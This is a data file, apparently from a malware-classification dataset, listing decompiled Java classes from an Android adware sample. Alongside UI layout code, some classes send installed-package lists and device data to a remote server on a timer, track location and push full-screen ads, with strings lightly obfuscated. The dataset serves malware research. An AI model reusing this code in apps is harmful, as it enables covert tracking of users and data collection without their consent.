StateListDrawable();     stateListDrawable2.addState(new int[]{R.attr.state_pressed},com.baty.pczy.facy.pap.s.g.a(this.h,59));     stateListDrawable2.addState(new int[]{R.attr.state_selected},com.baty.pczy.facy.pap.s.g.a(this.h,60));     stateListDrawable2.addState(new int[]{R.attr.state_enabled},com.baty.pczy.facy.pap.s.g.a(this.h,58));     this.l.setBackgroundDrawable(stateListDrawable2);     linearLayout5.addView(this.l,layoutParams7);     this.k.setSelected(true);     this.l.setSelected(false);     this.i=new com.baty.pczy.facy.pap.r.a(this.h,this.m);     this.b=new l(this.h);     FrameLayout frameLayout2=new FrameLayout(this.h);     FrameLayout.LayoutParams layoutParams8=new FrameLayout.LayoutParams(-1,-1);     frameLayout2.addView(this.i,layoutParams8);     frameLayout2.addView(this.b,layoutParams8);     linearLayout4.addView(frameLayout2,new LinearLayout.LayoutParams(-1,-2));     if (this.a) {       i();     }  else {       h();     }     this.i.a(this);   }   public void b(){     this.i.e();   }   public boolean c(){     return this.i.f();   }   public void d(){     this.i.g();     e();   }   public void e(){     this.j.b(this.m);     this.i.h();   }   public com.baty.pczy.facy.pap.d.a f(){     return this.j.c();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.t\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1ea30f94"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.t\c.code","public class c implements View.OnClickListener {   final a a;   public c(  a aVar){     this.a=aVar;   }   @Override public void onClick(  View view){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.t\d.code","public class d extends LinearLayout {   private Context a;   private com.baty.pczy.facy.pap.b.b b;   private com.baty.pczy.facy.pap.e.f f96c;   private Bitmap d;   private Drawable e;   private f f;   private String[] g;   public d(  Context context,  com.baty.pczy.facy.pap.e.f fVar){     super(context);     this.f=null;     this.a=context;     this.f96c=fVar;     setLayoutParams(new LinearLayout.LayoutParams(-1,-1));     this.b=com.baty.pczy.facy.pap.b.b.a(getContext());     this.d=com.baty.pczy.facy.pap.s.g.b(this.a,10);     this.e=new BitmapDrawable(this.d);     this.g=com.baty.pczy.facy.pap.s.a.a(this.f96c.d,"";"");     c();   }   private void c(){     int length=this.g.length;     int c2=com.baty.pczy.facy.pap.s.a.c(this.a);     int a=com.baty.pczy.facy.pap.s.a.a(this.a,3);     setPadding(a,a,a,a);     for (int i=0; i < length; i++) {       ImageView imageView=new ImageView(this.a);       imageView.setBackgroundDrawable(this.e);       imageView.setTag(Integer.valueOf(i));       imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);       LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(0,-2);       layoutParams.weight=1.0f;       if (i > 0) {         layoutParams.leftMargin=com.baty.pczy.facy.pap.s.a.a(this.a,3);       }       layoutParams.width=((c2 - (a * 2)) - ((length - 1) * layoutParams.leftMargin)) / length;       layoutParams.height=(int)(layoutParams.width * ((this.d.getHeight() * 1.0f) / this.d.getWidth()));       addView(imageView,layoutParams);       imageView.setOnClickListener(new e(this));     }   }   public void a(){     if (this.g == null) {       return;     }     int i=0;     while (true) {       int i2=i;       if (i2 >= getChildCount()) {         return;       }       this.b.a((ImageView)getChildAt(i2),this.g[i2],com.baty.pczy.facy.pap.f.d.a(this.f96c.p,this.g[i2]),null,com.baty.pczy.facy.pap.b.e.Type_capture);       i=i2 + 1;     }   }   public void a(  f fVar){     this.f=fVar;   }   public void b(){     int i=0;     while (true) {       int i2=i;       if (i2 >= getChildCount()) {         return;       }       ImageView imageView=(ImageView)getChildAt(i2);       imageView.setImageBitmap(null);       imageView.setBackgroundDrawable(this.e);       this.b.a(this.g[i2],com.baty.pczy.facy.pap.b.e.Type_capture);       i=i2 + 1;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.t\e.code","public class e implements View.OnClickListener {   final d a;   public e(  d dVar){     this.a=dVar;   }   @Override public void onClick(  View view){     f fVar;     fVar=this.a.f;     fVar.a(((Integer)view.getTag()).intValue());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.t\f.code","public interface f {   void a(  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.t\g.code","public class g extends LinearLayout implements View.OnClickListener {   private ImageView a;   private TextView b;   private ImageView f97c;   private TextView d;   private View.OnClickListener e;   private Context f;   private int g;   private LinearLayout h;   private Button i;   private LinearLayout j;   public g(  Context context){     super(context);     this.h=new LinearLayout(context);     this.h.setOrientation(1);     addView(this.h,-1,-1);     this.j=new LinearLayout(context);     this.j.setOrientation(0);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     layoutParams.setMargins(0,com.baty.pczy.facy.pap.s.a.a(context,10),0,com.baty.pczy.facy.pap.s.a.a(context,10));     this.h.addView(this.j,layoutParams);     this.f=context;     setPadding(com.baty.pczy.facy.pap.s.a.a(context,6),com.baty.pczy.facy.pap.s.a.a(context,6),com.baty.pczy.facy.pap.s.a.a(context,6),com.baty.pczy.facy.pap.s.a.a(context,6));     Bitmap b=com.baty.pczy.facy.pap.s.g.b(this.f,16);     FrameLayout frameLayout=new FrameLayout(context);     this.a=new ImageView(context);     this.a.setBackgroundDrawable(new BitmapDrawable(b));     FrameLayout.LayoutParams layoutParams2=new FrameLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(context,55),com.baty.pczy.facy.pap.s.a.a(context,55));     layoutParams2.gravity=17;     frameLayout.addView(this.a,layoutParams2);     this.f97c=new ImageView(context);     FrameLayout.LayoutParams layoutParams3=new FrameLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(context,18),com.baty.pczy.facy.pap.s.a.a(context,18));     layoutParams3.gravity=53;     frameLayout.addView(this.f97c,layoutParams3);     this.f97c.setVisibility(4);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-2,-2);     layoutParams4.gravity=17;     this.j.addView(frameLayout,layoutParams4);     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setPadding(com.baty.pczy.facy.pap.s.a.a(context,10),0,0,0);     linearLayout.setOrientation(1);     FrameLayout frameLayout2=new FrameLayout(context);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-1,-2);     layoutParams5.bottomMargin=com.baty.pczy.facy.pap.s.a.a(context,5);     linearLayout.addView(frameLayout2,layoutParams5);     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(0);     frameLayout2.addView(linearLayout2,new FrameLayout.LayoutParams(-2,-2));     this.b=new TextView(context);     this.b.setTextColor(-16777216);     this.b.setTextSize(16.0f);     this.b.getPaint().setFakeBoldText(true);     linearLayout2.addView(this.b,new LinearLayout.LayoutParams(-2,-2));     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(0);     linearLayout.addView(linearLayout3,new LinearLayout.LayoutParams(-1,-2));     this.d=new TextView(this.f);     this.d.setTextColor(-16777216);     this.d.setTextSize(14.0f);     this.d.setSingleLine();     this.d.setEllipsize(TextUtils.TruncateAt.END);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-2,-2);     layoutParams6.topMargin=com.baty.pczy.facy.pap.s.a.a(context,5);     linearLayout.addView(this.d,layoutParams6);     LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(-2,-2);     layoutParams7.weight=1.0f;     layoutParams7.gravity=17;     this.j.addView(linearLayout,layoutParams7);     FrameLayout frameLayout3=new FrameLayout(context);     LinearLayout.LayoutParams layoutParams8=new LinearLayout.LayoutParams(-2,-2);     layoutParams8.gravity=17;     this.j.addView(frameLayout3,layoutParams8);     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed},com.baty.pczy.facy.pap.s.g.a(this.f,52));     stateListDrawable.addState(new int[]{R.attr.state_enabled},com.baty.pczy.facy.pap.s.g.a(this.f,53));     stateListDrawable.addState(new int[]{R.attr.state_focused},com.baty.pczy.facy.pap.s.g.a(this.f,53));     this.i=new Button(context);     this.i.setBackgroundDrawable(stateListDrawable);     this.i.setFocusable(false);     this.i.setOnClickListener(this);     FrameLayout.LayoutParams layoutParams9=new FrameLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(context,42),com.baty.pczy.facy.pap.s.a.a(context,42));     layoutParams9.gravity=5;     frameLayout3.addView(this.i,layoutParams9);   }   public ImageView a(){     return this.a;   }   public void a(  int i){     this.g=i;   }   public void a(  View.OnClickListener onClickListener,  int i){     this.i.setTag(Integer.valueOf(i));     this.e=onClickListener;   }   public void a(  com.baty.pczy.facy.pap.e.f fVar){   }   public void a(  String str){     this.b.setText(str);   }   public void a(  boolean z){     if (z) {       this.f97c.setVisibility(0);     }  else {       this.f97c.setVisibility(4);     }   }   public void b(  String str){     this.d.setText(str);   }   public void c(  String str){   }   @Override public void onClick(  View view){     if (this.e != null) {       this.e.onClick(view);     }   }   @Override public boolean onTouchEvent(  MotionEvent motionEvent){     return super.onTouchEvent(motionEvent);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\A.code","public final class A extends C0020s implements GestureDetector.OnGestureListener {   GestureDetector f98c;   ViewFlipper d;   int e;   private int f;   private int g;   private int h;   private int i;   private int j;   private int k;   private int l;   private int m;   private int n;   private int o;   private int p;   private int q;   private int r;   private int s;   private LinearLayout t;   public A(  SA sa,  List list,  int i){     super(sa,list);     this.f=1;     this.g=32;     this.h=this.g / 2;     this.i=275;     this.j=180;     this.k=5;     this.l=50;     this.m=50;     this.n=14;     this.o=96;     this.p=36;     this.q=this.i + this.g + (this.f << 1);     this.r=this.j + this.g + (this.f << 1)+ this.k+ this.m;     this.s=12;     this.e=0;     this.e=i;     this.f98c=new GestureDetector(sa,this);     b();   }   @Override public final int a(  View view,  Q q){     this.d.removeView(view);     this.e=super.a(view,q);     return this.e;   }   @Override protected final void c(){     this.f=an.a(getContext(),this.f);     this.g=an.a(getContext(),this.g);     this.q=an.a(getContext(),this.q);     this.r=an.a(getContext(),this.r);     this.h=an.a(getContext(),this.h);     this.i=an.a(getContext(),this.i);     this.j=an.a(getContext(),this.j);     this.k=an.a(getContext(),this.k);     this.l=an.a(getContext(),this.l);     this.m=an.a(getContext(),this.m);     this.p=an.a(getContext(),this.p);     this.o=an.a(getContext(),this.o);     this.s=an.a(getContext(),this.s);     Rect rect=new Rect();     this.a.getWindow().getDecorView().getWindowVisibleDisplayFrame(rect);     new StringBuilder().append(""initParam: [imageWidth: "").append(this.i).append("",imageHeight: "").append(this.j).append("",outContainerWidth: "").append(this.q).append("",outContainerHeight: "").append(this.r).append(""]"").append(rect);     int width=rect.width() - this.q;     new StringBuilder().append(""extraWidth: "").append(width).append("",frame.width: "").append(rect.width()).append("",outContainerWidth: "").append(this.q);     if (width < 0 || Math.abs(width) > 10) {       double height=(rect.height() - 10) / this.r;       double width2=(rect.width() - 10) / this.q;       if (height <= width2) {         width2=height;       }       double d=width2 <= 1.5d ? width2 : 1.5d;       this.f=(int)(this.f * d);       this.g=(int)(this.g * d);       this.q=(int)(this.q * d);       this.r=(int)(this.r * d);       this.h=(int)(this.h * d);       this.i=(int)(this.i * d);       this.j=(int)(this.j * d);       this.k=(int)(this.k * d);       this.l=(int)(this.l * d);       this.m=(int)(this.m * d);       this.p=(int)(this.p * d);       this.o=(int)(this.o * d);       this.n=(int)(this.n * d);       this.s=(int)(this.s * d);       new StringBuilder().append(""initParam: [rate: "").append(d).append("",imageWidth: "").append(this.i).append("",imageHeight: "").append(this.j).append("",outContainerWidth: "").append(this.q).append("",outContainerHeight: "").append(this.r).append(""]"");     }   }   @Override protected final void d(){     float a=an.a(getContext(),5.0f);     ShapeDrawable shapeDrawable=new ShapeDrawable(new RoundRectShape(new float[]{a,a,a,a,a,a,a,a},null,null));     shapeDrawable.setPadding(this.f,this.f,this.f,this.f);     shapeDrawable.getPaint().setColor(-1);     RelativeLayout relativeLayout=new RelativeLayout(getContext());     relativeLayout.setLayoutParams(new LinearLayout.LayoutParams(this.q,this.r));     addView(relativeLayout);     LinearLayout linearLayout=new LinearLayout(getContext());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.setMargins(this.h,this.h,this.h,this.h);     layoutParams.addRule(13,-1);     linearLayout.setLayoutParams(layoutParams);     linearLayout.setBackgroundDrawable(shapeDrawable);     linearLayout.setOrientation(1);     linearLayout.setGravity(17);     relativeLayout.addView(linearLayout);     ImageView imageView=new ImageView(getContext());     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(10,-1);     layoutParams2.addRule(11,-1);     int i=this.g;     layoutParams2.width=i;     layoutParams2.height=i;     imageView.setLayoutParams(layoutParams2);     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     getContext();     imageView.setImageDrawable(an.a(S.f));     relativeLayout.addView(imageView);     imageView.setOnClickListener(new ViewOnClickListenerC0021t(this));     this.d=new ViewFlipper(getContext());     this.d.setLayoutParams(new LinearLayout.LayoutParams(-2,-2));     for (    Q q : this.b) {       LinearLayout linearLayout2=new LinearLayout(getContext());       linearLayout2.setLayoutParams(new LinearLayout.LayoutParams(-2,-2));       linearLayout2.setOrientation(1);       ImageView imageView2=new ImageView(getContext());       imageView2.setLayoutParams(new LinearLayout.LayoutParams(this.i,this.j));       imageView2.setScaleType(ImageView.ScaleType.FIT_XY);       a(imageView2,q.b(),true);       linearLayout2.addView(imageView2);       LinearLayout linearLayout3=new LinearLayout(getContext());       LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);       layoutParams3.topMargin=this.k;       linearLayout3.setLayoutParams(layoutParams3);       linearLayout3.setOrientation(0);       linearLayout2.addView(linearLayout3);       ImageView imageView3=new ImageView(getContext());       imageView3.setLayoutParams(new LinearLayout.LayoutParams(this.l,this.m));       imageView3.setScaleType(ImageView.ScaleType.FIT_XY);       a(imageView3,q.j(),false);       linearLayout3.addView(imageView3);       LinearLayout linearLayout4=new LinearLayout(getContext());       LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(0,-1);       layoutParams4.leftMargin=an.a(getContext(),4.0f);       layoutParams4.weight=1.0f;       linearLayout4.setLayoutParams(layoutParams4);       linearLayout4.setGravity(16);       linearLayout4.setOrientation(1);       linearLayout3.addView(linearLayout4);       TextView textView=new TextView(getContext());       LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-2,-2);       if (Q.a.equals(q.h())) {         textView.setText(q.d());       }  else {         textView.setText(q.c());       }       textView.setTextColor(-16777216);       textView.setTextSize(this.n);       textView.setTypeface(Typeface.DEFAULT_BOLD);       textView.setLayoutParams(layoutParams5);       linearLayout4.addView(textView);       if (Q.a.equals(q.h())) {         TextView textView2=new TextView(getContext());         LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-2,-2);         layoutParams6.topMargin=an.a(getContext(),2.0f);         textView2.setText(q.l());         textView2.setTextColor(-16777216);         textView2.setTextSize(this.n - 2);         textView2.setLayoutParams(layoutParams6);         linearLayout4.addView(textView2);       }       ImageView imageView4=new ImageView(getContext());       LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(this.o,this.p);       layoutParams7.gravity=16;       imageView4.setLayoutParams(layoutParams7);       imageView4.setScaleType(ImageView.ScaleType.FIT_XY);       if (Q.a.equals(q.h())) {         getContext();         imageView4.setImageDrawable(an.a(S.g));       }  else {         getContext();         imageView4.setImageDrawable(an.a(S.h));       }       linearLayout3.addView(imageView4);       this.d.addView(linearLayout2);     }     linearLayout.addView(this.d);     this.t=new LinearLayout(getContext());     RelativeLayout.LayoutParams layoutParams8=new RelativeLayout.LayoutParams(-1,-2);     layoutParams8.addRule(12,-1);     layoutParams8.addRule(14,-1);     layoutParams8.bottomMargin=this.g;     this.t.setVisibility(8);     this.t.setLayoutParams(layoutParams8);     this.t.setGravity(1);     relativeLayout.addView(this.t);     if (this.e < 0 || this.e >= this.b.size()) {       this.e=0;     }     this.d.setDisplayedChild(this.e);     if (CPManager.getInstance() != null) {       CPManager.getInstance().a(this.e + 1);     }     a(this.e);     B b=new B(this,linearLayout);     Animation scaleAnimation=new ScaleAnimation(0.0f,1.0f,0.0f,1.0f,1,0.5f,1,0.5f);     scaleAnimation.setDuration(1000L);     scaleAnimation.setAnimationListener(new AnimationAnimationListenerC0025x(this,b,relativeLayout));     relativeLayout.startAnimation(scaleAnimation);   }   @Override public final void f(){     TranslateAnimation translateAnimation=new TranslateAnimation(1,1.0f,1,0.0f,1,0.0f,1,0.0f);     translateAnimation.setDuration(500L);     TranslateAnimation translateAnimation2=new TranslateAnimation(1,0.0f,1,-1.0f,1,0.0f,1,0.0f);     translateAnimation2.setDuration(500L);     this.d.setInAnimation(translateAnimation);     this.d.setOutAnimation(translateAnimation2);     this.d.showNext();     this.e++;     if (this.e >= this.b.size()) {       this.e=0;     }     if (CPManager.getInstance() != null) {       CPManager.getInstance().a(this.e + 1);     }     a(this.e);   }   @Override public final boolean onDown(  MotionEvent motionEvent){     g();     return false;   }   @Override public final boolean onFling(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     if (this.b.size() <= 1) {       return true;     }     if (motionEvent2.getX() - motionEvent.getX() > 120.0f) {       TranslateAnimation translateAnimation=new TranslateAnimation(1,-1.0f,1,0.0f,1,0.0f,1,0.0f);       translateAnimation.setDuration(500L);       TranslateAnimation translateAnimation2=new TranslateAnimation(1,0.0f,1,1.0f,1,0.0f,1,0.0f);       translateAnimation2.setDuration(500L);       this.d.setInAnimation(translateAnimation);       this.d.setOutAnimation(translateAnimation2);       this.d.showPrevious();       this.e--;       if (this.e < 0) {         this.e=this.b.size() - 1;       }       if (CPManager.getInstance() != null) {         CPManager.getInstance().a(this.e + 1);       }       a(this.e);     }  else     if (motionEvent2.getX() - motionEvent.getX() < -120.0f) {       f();     }     g();     return true;   }   @Override public final void onLongPress(  MotionEvent motionEvent){     g();   }   @Override public final boolean onScroll(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     g();     return false;   }   @Override public final void onShowPress(  MotionEvent motionEvent){     g();   }   @Override public final boolean onSingleTapUp(  MotionEvent motionEvent){     g();     if (this.e >= this.b.size()) {       f();     }  else {       b(this.d.getChildAt(this.e),(Q)this.b.get(this.e));     }     return true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\aa.code","public interface aa {   void a(  boolean z,  String str); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ab.code","public final class ab implements Runnable {   private URL a=null;   private aa b;   private String f112c;   private String d;   private Context e;   public final void a(  Context context,  String str,  String str2,  String str3){     this.e=context;     this.f112c=str2;     this.d=str3;     try {       this.a=new URL(str);     }  catch (    MalformedURLException e) {       new StringBuilder().append("""").append(e);     }     new StringBuilder().append(""setBaseRequestInfo, url: "").append(str);   }   public final void a(  aa aaVar){     this.b=aaVar;   }   @Override public final void run(){     int b=P.b(this.e);     if (b == 0) {       return;     }     Context context=this.e;     new StringBuilder().append(""\nG_èŽ·å�–æ•°æ�®  > "").append(new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"").format(new Date(System.currentTimeMillis())));     Context context2=this.e;     new StringBuilder().append(""\nG_JSON      "").append(this.d);     if (this.a == null) {       Context context3=this.e;       throw new IllegalArgumentException(""URL must be init!_feiwocp"".replace(""_feiwocp"",""""));     }     if (aq.a(this.f112c)) {       Context context4=this.e;       throw new IllegalArgumentException(""password must be init!_feiwocp"".replace(""_feiwocp"",""""));     }     HttpURLConnection httpURLConnection=null;     try {       try {         try {           try {             String defaultHost=Proxy.getDefaultHost();             int defaultPort=Proxy.getDefaultPort();             new StringBuilder().append(""proxyHost: "").append(defaultHost).append("", port: "").append(defaultPort);             HttpURLConnection httpURLConnection2=(2 != b || defaultHost == null || defaultPort <= 0) ? (HttpURLConnection)this.a.openConnection() : (HttpURLConnection)this.a.openConnection(new java.net.Proxy(Proxy.Type.HTTP,new InetSocketAddress(defaultHost,defaultPort)));             httpURLConnection2.setRequestMethod(""POST_feiwocp"".replace(""_feiwocp"",""""));             httpURLConnection2.setRequestProperty(""content-type"",""application/x-www-form-urlencoded_feiwocp"".replace(""_feiwocp"",""""));             httpURLConnection2.addRequestProperty(""appkey_feiwocp"".replace(""_feiwocp"",""""),this.f112c);             httpURLConnection2.setDoOutput(true);             httpURLConnection2.setConnectTimeout(60000);             httpURLConnection2.setReadTimeout(30000);             BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(httpURLConnection2.getOutputStream()));             bufferedWriter.write(R.a(this.d,R.a(this.f112c),false));             bufferedWriter.close();             int responseCode=httpURLConnection2.getResponseCode();             new StringBuilder().append(""get url response code: "").append(responseCode).append("", "").append(this.a);             BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(responseCode != 200 ? httpURLConnection2.getErrorStream() : httpURLConnection2.getInputStream()));             StringBuilder sb=new StringBuilder();             while (true) {               String readLine=bufferedReader.readLine();               if (readLine == null) {                 break;               }  else {                 sb.append(readLine);               }             }             bufferedReader.close();             if (responseCode == 200) {               this.b.a(true,R.a(sb.toString(),R.a(this.f112c)));             }  else {               this.b.a(false,R.a(sb.toString(),R.a(this.f112c)));             }             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }           }  catch (          Exception e) {             this.b.a(false,""Exception: _feiwocp"".replace(""_feiwocp"","""") + e);             Context context5=this.e;             new StringBuilder().append(""\nG_error Exception > "").append(e).append("" > "");             if (0 != 0) {               httpURLConnection.disconnect();             }           }         }  catch (        SocketTimeoutException e2) {           Context context6=this.e;           new StringBuilder().append(""\nG_error > SocketTimeoutException > "").append(e2).append("" > "");           this.b.a(false,""SocketTimeoutException _feiwocp"".replace(""_feiwocp"","""") + e2);           if (0 != 0) {             httpURLConnection.disconnect();           }         }       }  catch (      SocketException e3) {         Context context7=this.e;         new StringBuilder().append(""\nG_error SocketException > "").append(e3).append("" > "");         this.b.a(false,""SocketException _feiwocp"".replace(""_feiwocp"","""") + e3);         if (0 != 0) {           httpURLConnection.disconnect();         }       } catch (      IOException e4) {         Context context8=this.e;         new StringBuilder().append(""\nG_error IOException > "").append(e4).append("" > "");         this.b.a(false,""IOException: _feiwocp"".replace(""_feiwocp"","""") + e4);         if (0 != 0) {           httpURLConnection.disconnect();         }       }     }  catch (    Throwable th) {       if (0 != 0) {         httpURLConnection.disconnect();       }       throw th;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\AbstractC0002a.code","public abstract class AbstractC0002a {   static boolean a=false;   private String f111c;   private Context d;   private TimerTask g;   private Handler i;   boolean b=false;   private boolean e=false;   private int f=10;   private Timer h=new Timer();   public AbstractC0002a(  Context context,  String str){     this.i=null;     this.d=context;     this.f111c=str;     a=false;     ap.b(context,S.j,S.k,str);     ap.a(context,S.j,S.m,true);     try {       this.i=new Handler();     }  catch (    Exception e) {     }     try {       aj.a();     }  catch (    Exception e2) {     }     try {       P.c(context);     }  catch (    Exception e3) {     }     if (P.a(context) && P.a(this.d)) {       if (!this.e) {         Context context2=this.d;         a(true);       }       new C0003b(this).start();     }   }   public static void a(  AbstractC0002a abstractC0002a){     JSONObject a2=H.a(abstractC0002a.d,abstractC0002a.f111c,S.a);     ab abVar=new ab();     abVar.a(abstractC0002a.d,I.c(),abstractC0002a.f111c,a2.toString());     abVar.a(new C0005d(abstractC0002a));     Z.a().a(abVar);   }   public static void b(  AbstractC0002a abstractC0002a){     String a2=ap.a(abstractC0002a.d,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),(String)null);     if (a2 != null) {       String[] split=a2.split("","");       JSONArray jSONArray=new JSONArray();       for (      String str : split) {         if (!aq.a(str)) {           JSONObject jSONObject=new JSONObject();           try {             jSONObject.put(""packageName_feiwocp"".replace(""_feiwocp"",""""),str);           }  catch (          JSONException e) {           }           jSONArray.put(jSONObject);         }       }       if (jSONArray.length() != 0) {         JSONObject a3=H.a(abstractC0002a.d,S.a,jSONArray);         ab abVar=new ab();         abVar.a(abstractC0002a.d,I.d(),abstractC0002a.f111c,a3.toString());         abVar.a(new C0006e(abstractC0002a));         Z.a().a(abVar);       }     }   }   public static boolean isShowAtScreenOn(){     return a;   }   public void a(){     this.e=true;     if (this.g != null) {       this.g.cancel();       this.g=null;       this.h.cancel();     }   }   public final void a(  JSONArray jSONArray){     for (int i=0; i < jSONArray.length(); i++) {       String optString=jSONArray.optJSONObject(i).optString(""image_feiwocp"".replace(""_feiwocp"",""""));       if (!aq.a(optString)) {         this.i.postDelayed(new RunnableC0007f(this,optString),10L);       }       String optString2=jSONArray.optJSONObject(i).optString(""icon_feiwocp"".replace(""_feiwocp"",""""));       if (!aq.a(optString2)) {         this.i.postDelayed(new RunnableC0008g(this,optString2),10L);       }     }   }   public final void a(  boolean z){     if (z) {       this.f=10;     }  else {       this.f--;     }     if (this.f >= 0 && !this.e) {       if (z) {         if (this.g != null) {           this.g.cancel();           Context context=this.d;         }         b();         return;       }       if (this.g != null) {         Context context2=this.d;         return;       }       this.g=new C0004c(this);       this.h.schedule(this.g,360000L);       Context context3=this.d;     }   }   public final boolean a(  List list,  int i){     try {       Intent intent=new Intent(this.d,(Class<?>)SA.class);       intent.addFlags(335544320);       intent.putExtra(""itemList_feiwocp"".replace(""_feiwocp"",""""),(ArrayList)list);       intent.putExtra(""index_feiwocp"".replace(""_feiwocp"",""""),i);       if (this.i != null) {         this.i.post(new RunnableC0009h(this,intent));       }  else {         this.d.startActivity(intent);       }       return true;     }  catch (    Exception e) {       return false;     }   }   public abstract void b();   public void c(){     this.b=false;     this.g=null;   }   public final String d(){     return this.f111c;   }   public final Context e(){     return this.d;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ac.code","public final class ac {   private static ac f113c;   private double a=0.0d;   private double b=0.0d;   public ac(){     new ad(this);   }   public static ac c(){     if (f113c == null) {       f113c=new ac();     }     return f113c;   }   public final double a(){     return this.a;   }   public final double b(){     return this.b;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ad.code","public final class ad implements LocationListener {   private ac a;   public ad(  ac acVar){     this.a=acVar;   }   @Override public final void onLocationChanged(  Location location){     this.a.a=location.getLatitude();     this.a.b=location.getLongitude();   }   @Override public final void onProviderDisabled(  String str){   }   @Override public final void onProviderEnabled(  String str){   }   @Override public final void onStatusChanged(  String str,  int i,  Bundle bundle){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ae.code","public final class ae {   private static ae b=null;   private static Context f114c;   private NotificationManager a;   private ae(  Context context){     this.a=null;     if (this.a == null) {       this.a=(NotificationManager)context.getSystemService(""notification"");     }   }   private ImageView a(  View view){     if (!(view instanceof ViewGroup)) {       if (view instanceof ImageView) {         return (ImageView)view;       }       return null;     }     ViewGroup viewGroup=(ViewGroup)view;     for (int childCount=viewGroup.getChildCount(); childCount > 0; childCount--) {       ImageView a=a(viewGroup.getChildAt(childCount - 1));       if (a != null && a.getId() == 16908294) {         return a;       }     }     return null;   }   public static ae a(  Context context){     f114c=context;     if (b == null) {       b=new ae(f114c);     }     return b;   }   public final void a(  int i){     this.a.cancel(i);   }   public final void a(  int i,  int i2,  String str,  String str2,  String str3,  Intent intent,  int i3,  String str4,  long j){     Notification notification=new Notification();     notification.icon=android.R.drawable.ic_menu_share;     notification.tickerText=str;     notification.flags=i3;     notification.when=j;     notification.setLatestEventInfo(f114c,str2,str3,PendingIntent.getActivity(f114c,0,intent,134217728));     if (str4 == null || str4.length() == 0 || notification == null) {       return;     }     try {       ImageView a=a(View.inflate(f114c,notification.contentView.getLayoutId(),null));       Y.a();       Bitmap a2=K.a().a(f114c,Y.a(f114c,S.d,str4));       if (a2 != null) {         notification.contentView.setImageViewBitmap(a.getId(),a2);       }       this.a.notify(i,notification);     }  catch (    Exception e) {       new StringBuilder().append(""NotificationManagerTool >> "").append(e.getMessage());     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\af.code","public final class af {   private static final String a=""NumberUtil.java_feiwocp"".replace(""_feiwocp"","""");   public static int a(  String str,  int i){     if (str == null || str.equals("""")) {       return 0;     }     try {       return Integer.parseInt(str.trim());     }  catch (    NumberFormatException e) {       Log.w(a,""errorMessage > "" + e);       return 0;     }   } } "
